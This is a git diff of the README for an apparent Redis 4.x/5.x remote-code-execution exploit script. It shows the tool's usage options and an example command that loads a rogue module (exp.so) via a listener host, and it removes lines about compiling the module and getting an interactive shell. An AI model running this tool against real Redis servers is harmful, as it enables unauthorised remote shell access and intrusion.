@@ -5,9 +5,6 @@ A exploit for Redis 4.x/5.x RCE, inspired by [Redis post-exploitation](https://2
 This repo is a modified version of <https://github.com/n0b0dyCN/redis-rogue-server> .
 ## Usage:
 
-Compile exp.so from <https://github.com/RicterZ/RedisModules-ExecuteCommand>.
-
-
 ```
 usage: redis-rce.py [-h] -r RHOST [-p RPORT] -L LHOST [-P LPORT] [-f FILE]
                     [-a AUTH] [-v]
@@ -33,9 +30,6 @@ optional arguments:
 ```
 python redis-rce.py -r 127.0.0.1 -L 127.0.0.1 -f exp.so
 ```
+![image](https://user-images.githubusercontent.com/55566953/136344910-e2afabce-fa9d-4995-b911-cd2cb3b7dd84.png)
 
-![](https://blogpics-1251691280.file.myqcloud.com/imgs/20190708220258.png)
 
-The default target port is 6379 and the default vps port is 21000.
-
-And you will get an interactive shell!
